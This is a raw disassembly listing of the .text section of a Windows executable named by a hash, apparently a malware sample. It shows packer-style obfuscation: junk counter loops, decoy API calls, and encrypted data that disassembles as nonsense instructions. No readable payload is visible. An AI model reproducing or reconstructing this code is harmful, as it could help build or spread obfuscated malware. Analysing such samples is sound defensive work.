
c70f13cec3e5c99475882f1d9961ae5e0847e68e0ff2d6297bd572def313f781.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433817,0x1c
  401013:	cmp    DWORD PTR ds:0x433817,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433817,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433817,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433817
  401055:	dec    eax
  401056:	mov    ds:0x433817,eax
  40105b:	mov    eax,ds:0x433817
  401060:	dec    eax
  401061:	mov    ds:0x433817,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43381b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43381f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433853
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43382f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433813
  4010b6:	mov    DWORD PTR ds:0x43382f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4338ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43382f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43382f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43382f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43382f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43382f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43382f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43382f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43382f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4337f7
  40113c:	mov    eax,ds:0x4338b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43389b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43377f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43379f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4337db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR ds:0x7e33e68a,bh
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    BYTE PTR [ebp+0x0],dh
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x81e2b73a
  40126d:	sub    bl,BYTE PTR [edx]
  40126f:	add    ah,BYTE PTR [ebx+0x7cad8b03]
  401275:	out    dx,eax
  401276:	repnz pop edx
  401278:	sbb    BYTE PTR [eax],dl
  40127a:	ss inc bp
  40127d:	pop    esp
  40127e:	push   ss
  40127f:	push   es
  401280:	and    bh,BYTE PTR [ebp+0x6416fc0f]
  401286:	mov    bh,0xc0
  401288:	shl    ah,cl
  40128a:	pusha  
  40128b:	mov    al,ds:0xade77f42
  401290:	mov    esp,DWORD PTR [esi+0x7a]
  401293:	das    
  401294:	sahf   
  401295:	xchg   ebx,eax
  401296:	repz and al,0xbc
  401299:	bound  eax,QWORD PTR ds:0x7c9cbaf9
  40129f:	inc    esi
  4012a0:	push   ecx
  4012a1:	scas   al,BYTE PTR es:[edi]
  4012a2:	mov    esp,0xbca53d34
  4012a7:	call   0x2a52f02b
  4012ac:	sbb    dh,cl
  4012ae:	fdiv   DWORD PTR [ebp-0x29]
  4012b1:	repnz dec edi
  4012b3:	out    dx,eax
  4012b4:	push   edi
  4012b5:	gs adc eax,0x662338d
  4012bb:	jo     0x40127a
  4012bd:	shl    DWORD PTR [esi-0x51],0xed
  4012c1:	mov    DWORD PTR [ecx+0x60],ebp
  4012c4:	js     0x4012fa
  4012c6:	bnd je 0x4012a6
  4012c9:	les    ebp,FWORD PTR [edi]
  4012cb:	jg     0x401280
  4012cd:	lahf   
  4012ce:	adc    bl,BYTE PTR [ecx+0x38]
  4012d1:	inc    eax
  4012d2:	out    0x4f,al
  4012d4:	cmc    
  4012d5:	mov    al,ds:0xc3c75d0d
  4012da:	outs   dx,BYTE PTR ds:[esi]
  4012db:	push   0x23
  4012dd:	sbb    edi,DWORD PTR [esi-0x23]
  4012e0:	daa    
  4012e1:	mov    dl,0x2e
  4012e3:	xchg   esi,eax
  4012e4:	add    esp,DWORD PTR [esi+eax*1-0x4b]
  4012e8:	lahf   
  4012e9:	stc    
  4012ea:	pusha  
  4012eb:	push   edi
  4012ec:	je     0x401302
  4012ee:	outs   dx,DWORD PTR ds:[esi]
  4012ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012f0:	push   es
  4012f1:	je     0x401285
  4012f3:	dec    eax
  4012f4:	mov    edi,0x3eaabc06
  4012f9:	repz fsubp st(5),st
  4012fc:	add    BYTE PTR [edi+0x15756e8b],ah
  401302:	and    ah,bl
  401304:	data16 icebp 
  401306:	repz dec ecx
  401308:	das    
  401309:	mov    esp,0xba9ee19f
  40130e:	xchg   edx,eax
  40130f:	xchg   BYTE PTR [edi-0x68],ah
  401312:	scas   eax,DWORD PTR es:[edi]
  401313:	cs mov al,0x8f
  401316:	imul   eax,DWORD PTR [eax],0xe02fcdbc
  40131c:	xchg   DWORD PTR [eax+0x7e88b117],edi
  401322:	xlat   BYTE PTR ds:[ebx]
  401323:	loopne 0x40131e
  401325:	inc    ebp
  401326:	jnp    0x4012b5
  401328:	sti    
  401329:	add    ah,dh
  40132b:	popa   
  40132c:	sub    edi,esp
  40132e:	pop    ecx
  40132f:	jmp    0x86e6:0x8384373f
  401336:	mov    dh,BYTE PTR [eax-0x3f35d00d]
  40133c:	pushf  
  40133d:	shr    DWORD PTR [ebx],cl
  40133f:	sbb    al,0x5c
  401341:	pop    edi
  401342:	inc    edi
  401343:	inc    esi
  401344:	jecxz  0x401351
  401346:	ror    BYTE PTR [ecx+0x2581f445],cl
  40134c:	shl    DWORD PTR [edi],cl
  40134e:	inc    ebx
  40134f:	add    BYTE PTR [eax],al
  401351:	add    BYTE PTR [eax],al
  401353:	add    cl,ch
  401355:	or     eax,0x8b000000
  40135a:	sbb    eax,0x4337d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4337d3,ebx
  401366:	cmp    DWORD PTR ds:0x4337d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4337d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43378b,0x43377f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	xchg   esi,eax
  4013b4:	retf   0x7e3d
  4013b7:	cli    
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013c4
  4013c0:	add    BYTE PTR [esp+edx*4],bl
  4013c3:	ficom  WORD PTR [ebx]
  4013c5:	(bad)  
  4013c6:	mov    ebp,0xdd992c3e
  4013cb:	stc    
  4013cc:	sub    eax,0xe81ab7bc
  4013d1:	dec    ecx
  4013d2:	mov    ?,esi
  4013d4:	rcr    esi,0x78
  4013d7:	outs   dx,BYTE PTR ds:[esi]
  4013d8:	jge    0x40143b
  4013da:	out    0x36,eax
  4013dc:	cs xchg edi,eax
  4013de:	aam    0x3
  4013e0:	stos   BYTE PTR es:[edi],al
  4013e1:	xchg   DWORD PTR [esp+edx*4+0xdc2e354],edx
  4013e8:	(bad)  
  4013ea:	and    al,0xa8
  4013ec:	cmp    BYTE PTR [eax+0x5168b4c],cl
  4013f2:	mov    ds:0xf53d5976,al
  4013f7:	test   BYTE PTR [ebp-0x74],bl
  4013fa:	xor    ah,bl
  4013fc:	jp     0x401384
  4013fe:	imul   ebp,DWORD PTR [esi+0x318bdc06],0x5860ba0a
  401408:	or     al,0x3a
  40140a:	inc    ebp
  40140b:	sti    
  40140c:	mov    esp,ss
  40140e:	repz pop edi
  401410:	ins    BYTE PTR es:[edi],dx
  401411:	push   ebp
  401412:	and    al,bh
  401414:	xchg   esi,eax
  401415:	mov    DWORD PTR cs:[ebp+esi*8+0x504234f6],esp
  40141d:	aad    0xf8
  40141f:	shl    BYTE PTR [ebp+0x56],cl
  401422:	xchg   esi,eax
  401423:	or     eax,DWORD PTR [edi]
  401425:	pop    ss
  401426:	clc    
  401427:	xor    eax,0xe47daab7
  40142c:	popf   
  40142d:	mov    eax,0xd7c65c01
  401432:	ret    
  401433:	dec    eax
  401434:	pushf  
  401435:	inc    ecx
  401436:	pop    esi
  401437:	(bad)  
  401438:	jb     0x4014a3
  40143a:	rcr    DWORD PTR [edi+esi*1-0x44],0xd7
  40143f:	retf   0x9021
  401442:	iret   
  401443:	cmp    esi,DWORD PTR [edi]
  401445:	pusha  
  401446:	retf   0x1050
  401449:	pop    es
  40144a:	aad    0x72
  40144c:	mov    bh,0x66
  40144e:	aas    
  40144f:	push   edx
  401450:	loope  0x401447
  401452:	lea    edi,[ebx-0x1f]
  401455:	loopne 0x40143b
  401457:	add    BYTE PTR [esi+0x3ac7494c],0xde
  40145e:	mov    edx,0xcae378d5
  401463:	mov    eax,?
  401465:	dec    esp
  401467:	lock cmp DWORD PTR [ecx],ebp
  40146a:	adc    bh,BYTE PTR [esp+ebp*1+0x75]
  40146e:	ror    DWORD PTR [ebx-0x2bb159c7],1
  401474:	out    0xde,al
  401476:	jmp    0x4014f6
  401478:	frstor [edi+0x5b]
  40147b:	pop    edx
  40147c:	adc    DWORD PTR [edi+ecx*4],ebx
  40147f:	das    
  401480:	fld    TBYTE PTR [ecx-0x5f7c7de0]
  401486:	adc    al,0x4b
  401488:	jo     0x401471
  40148a:	lock ss xchg edi,eax
  40148d:	repnz std 
  40148f:	sbb    eax,0x1c1366f9
  401494:	fcom   QWORD PTR [eax+0x24]
  401497:	jnp    0x40146d
  401499:	xchg   edx,eax
  40149a:	lods   al,BYTE PTR gs:[esi]
  40149c:	push   edi
  40149d:	icebp  
  40149e:	loope  0x4014b7
  4014a0:	sahf   
  4014a1:	mov    WORD PTR [ebx],gs
  4014a3:	sub    al,0xfd
  4014a5:	mov    ah,0x3
  4014a7:	jo     0x401498
  4014a9:	sub    DWORD PTR [eax],0x27
  4014ac:	mov    ch,0x3b
  4014ae:	(bad)
  4014b2:	push   ds
  4014b3:	xlat   BYTE PTR ds:[ebx]
  4014b4:	or     al,0x68
  4014b6:	rcr    BYTE PTR [esi-0x3f],cl
  4014b9:	sbb    BYTE PTR [ebx+0x501d567c],0x94
  4014c0:	inc    esi
  4014c1:	cli    
  4014c2:	sub    ebx,DWORD PTR [edi]
  4014c4:	fcmovnbe st,st(7)
  4014c6:	in     al,dx
  4014c7:	xor    eax,DWORD PTR [esi]
  4014c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014ca:	retf   
  4014cb:	in     al,0x2d
  4014cd:	pusha  
  4014ce:	pop    eax
  4014cf:	lea    edx,[ebp-0x312390ab]
  4014d5:	lock pop edx
  4014d7:	jae    0x4014a1
  4014d9:	sub    eax,esp
  4014db:	int    0xe2
  4014dd:	sar    ecx,cl
  4014df:	cmp    al,0x56
  4014e1:	js     0x4014e3
  4014e3:	(bad)  
  4014e6:	out    dx,eax
  4014e7:	sbb    BYTE PTR [edi-0x38],bl
  4014ea:	shr    DWORD PTR [edi-0x10],cl
  4014ed:	hlt    
  4014ee:	retf   0xfadf
  4014f1:	inc    ebx
  4014f2:	(bad)  
  4014f4:	or     al,0xbc
  4014f6:	lahf   
  4014f7:	aad    0xcf
  4014f9:	in     al,0x20
  4014fb:	inc    esp
  4014fc:	lods   al,BYTE PTR ds:[esi]
  4014fd:	das    
  4014fe:	sbb    DWORD PTR [edx+eiz*1-0x23],ebp
  401502:	cwde   
  401503:	xchg   esp,eax
  401504:	push   ebp
  401505:	inc    edx
  401506:	jg     0x4014c7
  401508:	leave  
  401509:	rol    BYTE PTR [edx],cl
  40150b:	je     0x40151b
  40150d:	ja     0x4014fe
  40150f:	jo     0x4014d3
  401511:	sahf   
  401512:	in     eax,0x78
  401514:	out    dx,eax
  401515:	adc    eax,DWORD PTR [esi]
  401517:	cld    
  401518:	lods   eax,DWORD PTR ds:[esi]
  401519:	pushf  
  40151a:	xor    esi,DWORD PTR [edi+0x7fcb3010]
  401520:	sbb    cl,BYTE PTR [esp+ecx*1+0x224c293c]
  401527:	(bad)  
  401528:	mov    ebp,0x6d10e0fa
  40152d:	daa    
  40152e:	sub    DWORD PTR [ebp+0x28],ecx
  401531:	push   0xffffffcf
  401533:	pop    es
  401534:	jb     0x4015a5
  401536:	addr16 cli 
  401538:	or     dl,bl
  40153a:	adc    eax,DWORD PTR [edx]
  40153c:	push   0x24cceb2c
  401541:	pop    eax
  401542:	cli    
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43378f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x50a0b51d]
  401564:	or     eax,DWORD PTR [esi]
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x401558
  40156e:	cmp    BYTE PTR [ecx],al
  401570:	imul   ecx,DWORD PTR [edi],0x728b5d49
  401576:	ret    
  401577:	cwde   
  401578:	mov    ebp,0x6a9fa4f4
  40157d:	xchg   ebx,esi
  40157f:	jp     0x401540
  401581:	fnstcw WORD PTR [esi+0x31a2b2f2]
  401587:	xor    eax,0x9738e2cf
  40158c:	push   eax
  40158d:	repz mov esi,0x3203b133
  401593:	imul   ebx,DWORD PTR [ecx+0x2ee48cd7],0x2b52dc04
  40159d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40159e:	lahf   
  40159f:	mov    esp,0xc87d95b9
  4015a4:	cmp    eax,0x6a64c26
  4015a9:	fs out 0xd2,al
  4015ac:	push   esi
  4015ad:	push   0xe03e6e42
  4015b2:	fiadd  WORD PTR [ebx-0x59]
  4015b5:	mov    esi,0xb5d7e2f
  4015ba:	mov    esp,0xd57380b1
  4015bf:	jae    0x401595
  4015c1:	and    BYTE PTR [edi+0x6f],al
  4015c4:	mov    bh,BYTE PTR [edx+0x44]
  4015c7:	lea    edi,[edx+0xd]
  4015ca:	mov    al,0x21
  4015cc:	test   DWORD PTR [ecx+0x15],edi
  4015cf:	xlat   BYTE PTR ds:[ebx]
  4015d0:	xchg   edx,eax
  4015d1:	jns    0x401560
  4015d3:	ret    
  4015d4:	cwde   
  4015d5:	sbb    BYTE PTR [ecx-0x48f892da],ch
  4015db:	sub    al,0x3e
  4015dd:	xchg   edx,eax
  4015de:	sbb    ecx,DWORD PTR [edx]
  4015e0:	data16 sar cl,1
  4015e3:	mov    cl,0x33
  4015e5:	repz in eax,0x15
  4015e8:	xor    eax,0x51b0f3b8
  4015ed:	fistp  QWORD PTR [eax]
  4015ef:	mov    ds:0x68edf5ea,al
  4015f4:	add    al,0x11
  4015f6:	cmp    esi,DWORD PTR [esi+0x2326db97]
  4015fc:	lahf   
  4015fd:	ror    BYTE PTR [ebp+0x4b],1
  401600:	repz cmc 
  401602:	lods   al,BYTE PTR ds:[esi]
  401603:	cmp    DWORD PTR [ebp+0x3692e448],0x9ccb7bbd
  40160d:	(bad)  
  40160f:	(bad)  
  401610:	cs in  al,dx
  401612:	sar    DWORD PTR [ebx-0x43],1
  401615:	cld    
  401616:	dec    ecx
  401617:	mov    al,ah
  401619:	mov    cl,bh
  40161b:	xchg   ebp,eax
  40161c:	inc    esp
  40161d:	ins    DWORD PTR es:[edi],dx
  40161e:	jmp    DWORD PTR [edx-0xe]
  401621:	sub    ch,bl
  401623:	pop    ecx
  401624:	aas    
  401625:	inc    edi
  401626:	loop   0x4015ed
  401628:	cmp    eax,0x3a496d27
  40162d:	sbb    cl,BYTE PTR [esi+0x4d]
  401630:	dec    edx
  401631:	and    eax,0x4b19dfd4
  401636:	mov    edx,0x4db359d1
  40163b:	sbb    DWORD PTR [ebp+0x5a],edi
  40163e:	stc    
  40163f:	dec    DWORD PTR [edx-0x2c]
  401642:	idiv   BYTE PTR [eax-0x3a]
  401645:	jb     0x4016c1
  401647:	stos   DWORD PTR es:[edi],eax
  401648:	inc    ebx
  401649:	mov    eax,0xbd7c26d5
  40164e:	inc    esi
  40164f:	dec    ebp
  401650:	(bad)  
  401651:	jnp    0x401613
  401653:	adc    BYTE PTR [edi],bl
  401655:	sub    bl,cl
  401657:	popf   
  401658:	out    0x44,al
  40165a:	cwde   
  40165b:	pop    ds
  40165c:	daa    
  40165d:	add    ecx,ebx
  40165f:	pop    ebx
  401660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401661:	mov    ds:0x523a30a5,eax
  401666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401667:	(bad)  [edx]
  401669:	lods   eax,DWORD PTR ds:[esi]
  40166a:	inc    ebx
  40166b:	loop   0x4016b8
  40166d:	ins    DWORD PTR es:[edi],dx
  40166e:	dec    eax
  40166f:	add    cl,BYTE PTR [edi+0xb2965fc]
  401675:	mov    bl,0x37
  401677:	sub    ebx,ebp
  401679:	inc    eax
  40167a:	sbb    DWORD PTR [esi-0x5b],ecx
  40167d:	jmp    0x26b6:0x416e957e
  401684:	in     eax,dx
  401685:	sub    esi,eax
  401687:	ror    BYTE PTR [ebp+ebp*4+0x60278769],0x36
  40168f:	es rdpmc 
  401692:	and    al,bh
  401694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401695:	jecxz  0x4016c2
  401697:	or     ebp,edi
  401699:	aad    0x1c
  40169b:	push   0x24cd35c0
  4016a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016a1:	imul   edi,DWORD PTR [ecx-0x50fc378a],0xe84424c8
  4016ab:	in     al,dx
  4016ac:	sub    BYTE PTR [esi-0x7f],ch
  4016af:	ret    
  4016b0:	xchg   ecx,eax
  4016b1:	mov    bl,0x30
  4016b3:	iret   
  4016b4:	(bad)  [eax]
  4016b6:	leave  
  4016b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016b8:	push   cs
  4016b9:	sbb    al,0xc9
  4016bb:	call   DWORD PTR [esi+0x29674c3b]
  4016c1:	jb     0x401669
  4016c3:	(bad)  
  4016c4:	mov    esi,0x73658247
  4016c9:	rcr    BYTE PTR [ecx],1
  4016cb:	sbb    BYTE PTR [ecx-0x2f],ah
  4016ce:	out    0x5b,eax
  4016d0:	loop   0x401694
  4016d2:	(bad)  
  4016d3:	mov    edx,0x853fad1
  4016d8:	hlt    
  4016d9:	mov    ch,0xbc
  4016db:	adc    DWORD PTR [eax],esp
  4016dd:	sahf   
  4016de:	fcom   st(6)
  4016e0:	dec    esi
  4016e1:	pop    esi
  4016e2:	push   ds
  4016e3:	or     ebp,0x5ff8395b
  4016e9:	in     al,dx
  4016ea:	jg     0x40173a
  4016ec:	aaa    
  4016ed:	push   0xffffff8f
  4016ef:	jnp    0x401769
  4016f1:	add    eax,edi
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43385f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43385f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43385f,ebx
  401721:	cmp    DWORD PTR ds:0x43385f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43385f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43385f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43385f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43385f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433783,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433797
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43378b
  401793:	and    ecx,DWORD PTR ds:0x4337db
  401799:	mov    DWORD PTR ds:0x43378b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4338af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4338af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4338af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4338af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4338af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4338af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4338af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4338af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433863,0x0
  401819:	mov    eax,ds:0x433863
  40181e:	inc    eax
  40181f:	mov    ds:0x433863,eax
  401824:	cmp    DWORD PTR ds:0x433863,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4337a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433863,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43389f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4338ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4338ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4338ab,ecx
  401878:	cmp    DWORD PTR ds:0x4338ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4338ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4338ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4338ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4338ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xd6ade
  4018e9:	arpl   ax,sp
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x401897
  4018f4:	sub    bl,BYTE PTR [edx]
  4018f6:	jp     0x4018a5
  4018f8:	lods   eax,DWORD PTR ds:[esi]
  4018f9:	push   ebp
  4018fa:	retf   0xc4ac
  4018fd:	xchg   ebx,eax
  4018fe:	out    dx,eax
  4018ff:	out    dx,eax
  401900:	fadd   QWORD PTR [ebx]
  401902:	jo     0x401974
  401904:	jge    0x40191a
  401906:	jmp    0xd84160e2
  40190b:	call   0x294389c4
  401910:	data16 sti 
  401912:	pusha  
  401913:	ficom  WORD PTR ds:0x610ba381
  401919:	dec    esi
  40191a:	ror    DWORD PTR ds:0x56382fd4,0xce
  401921:	adc    BYTE PTR [ecx+0x6e],0x26
  401925:	mov    bh,0xf9
  401927:	in     al,dx
  401928:	mov    BYTE PTR [ebx],al
  40192a:	cld    
  40192b:	ret    0xafa9
  40192e:	jno    0x4018fe
  401930:	inc    edi
  401931:	outs   dx,DWORD PTR ds:[esi]
  401932:	adc    DWORD PTR [edi],esp
  401934:	retf   0xecd5
  401937:	mov    ds:0xd6a9a07d,al
  40193c:	sbb    eax,0x43a297da
  401941:	xchg   DWORD PTR [edi+edx*1-0x63],eax
  401945:	in     al,dx
  401946:	adc    al,0x40
  401948:	xor    DWORD PTR [esi],ebx
  40194a:	in     eax,dx
  40194b:	loopne 0x401973
  40194d:	clc    
  40194e:	dec    edx
  40194f:	cmc    
  401950:	adc    eax,0xd32870
  401955:	inc    esi
